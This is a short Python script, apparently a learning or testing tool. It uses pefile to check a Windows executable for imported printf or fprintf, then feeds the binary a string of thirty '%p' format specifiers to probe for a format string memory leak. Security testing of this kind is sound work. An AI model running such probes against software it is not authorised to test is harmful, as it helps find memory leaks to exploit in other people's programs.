import sys
import os
import subprocess
import pefile

target_path = ''

def validate_path():
    global target_path

    if len(sys.argv) < 2:
        print("please provide a target file")
        sys.exit(1)

    target_path = sys.argv[1]

    if not os.path.exists(target_path) or not os.path.isfile(target_path):
        print("Target file not found")
        sys.exit(1)

    print("Target located")

def change_working_dir():
    target_dir = os.path.dirname(target_path)
    os.chdir(target_dir)

def string_format_attack():
    print("Attempting string format attack")
    
    process = subprocess.Popen(f"\"{target_path}\"", stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)

    input_str = " ".join(["%p"] * 30) + "\n"
    output = process.communicate(input=input_str.encode())
    
    print(output)


def static_analysis():
    print("Analysing PE Imports")

    pe = pefile.PE(target_path)
    has_printf = False

    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        if entry.dll.decode('utf-8').lower() == 'msvcrt.dll':
            print(f"{entry.dll.decode('utf-8')}:")
            for imp in entry.imports:
                func_name = imp.name.decode('utf-8') if imp.name else str(imp.ordinal)
                print(f"\t{func_name}")
                if func_name == 'printf' or func_name == 'fprintf':
                    has_printf = True
    
    if has_printf:
        string_format_attack()
    else:
        print("No printf or fprintf found in imports.")

validate_path()
change_working_dir()
static_analysis()
